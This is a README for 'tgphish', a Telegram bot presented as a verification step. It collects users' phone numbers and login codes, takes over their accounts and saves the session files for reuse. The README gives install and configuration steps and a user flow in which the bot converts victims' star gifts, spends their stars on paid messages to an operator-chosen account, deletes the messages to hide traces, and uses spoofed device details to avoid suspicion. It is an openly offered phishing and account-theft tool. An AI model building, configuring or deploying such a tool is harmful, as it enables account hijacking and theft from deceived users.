## Overview

`tgphish` is a Python bot that automates the process of collecting Telegram session files, checking account status (premium, spam block, star balance), converting star gifts, and sending paid star messages to a target user. It uses both `pyTelegramBotAPI` (for the command interface) and `Telethon` (for interacting with user accounts after login).

The bot is designed to be used by a single **admin** who receives statistics and logs. End‑users provide their phone number and verification code, after which the bot:
- Logs into their account
- Checks premium status, spam block, star balance
- Converts any incoming star gifts into stars
- Sends random messages to a predefined target (each message costs 2 stars)
- Clears the message history with the target to hide traces
- Saves the session file for later reuse

All sessions are stored locally as `.session` files in the `sessions/` directory.

## Features

- **Phone number & code collection** – interactive inline keyboard for code input.
- **Session persistence** – sessions are saved to disk; admin can see how many sessions are still valid.
- **Star gift conversion** – automatically converts any saved star gifts into stars.
- **Paid message spam** – sends random messages to a target user, spending 2 stars per message.
- **Spam block detection** – checks `@SpamBot` for restrictions and cleans the chat afterwards.
- **Admin stats** – `/stats` command shows total and currently active sessions.
- **Emulated device info** – uses realistic device parameters to reduce suspicion.

## Requirements

- Python 3.7+
- A **Telegram API ID & API Hash** (get from [my.telegram.org](https://my.telegram.org))
- A **bot token** from [@BotFather](https://t.me/BotFather)
- Admin Telegram user ID (can be obtained from [@userinfobot](https://t.me/userinfobot))

## Installation

```bash
# Clone the repository
git clone https://github.com/Goidaa/tgphish.git
cd tgphish

# Install required packages
pip install telebot telethon
```

> Note: The script also uses built‑in modules (`os`, `asyncio`, `threading`, `random`, `json`, `time`).

## Configuration

Edit the following variables directly in the script (or better – move them to environment variables):

```python
API_ID = 2040                     # Your API ID
API_HASH = 'b18441a1ff607e10a989891a5462e627'
BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
textwhen = "Verification successful! Your gift: (ANYLINK)"

TARGET_USER = '@handler'          # Username to send paid messages to
ADMIN_ID = 2200371343             # Telegram user ID of the admin
SPAM_BOT = '@SpamBot'             # Don't change
```

- **`textwhen`** – message sent to the user after they successfully log in (before the spam starts).
- **`TARGET_USER`** – the account that will receive the star‑cost messages.
- **`ADMIN_ID`** – receives logs (new logins, stats, errors).

## 🚀 Usage

### Start the bot

```bash
python bot.py
```

The bot will start polling and respond to commands.

### User flow

1. User sends `/start` to the bot.
2. Bot asks for a phone number via a **contact button** (“✅I am not a bot!”).
3. User shares their phone number.
4. Bot sends a verification code request to the provided number.
5. User enters the code using an inline numeric keyboard.
6. Bot logs in, performs checks, and:
   - Reports account details to the admin.
   - Sends the `textwhen` message to the user.
   - Starts sending random messages to `TARGET_USER` (costs 2 stars each) until balance < 2.
   - Deletes the sent messages to hide the activity.
7. The session file is saved locally.

### Admin commands

| Command  | Description |
|----------|-------------|
| `/stats` | Counts all `.session` files and checks which ones are still valid (active). Result is sent privately to the admin. |
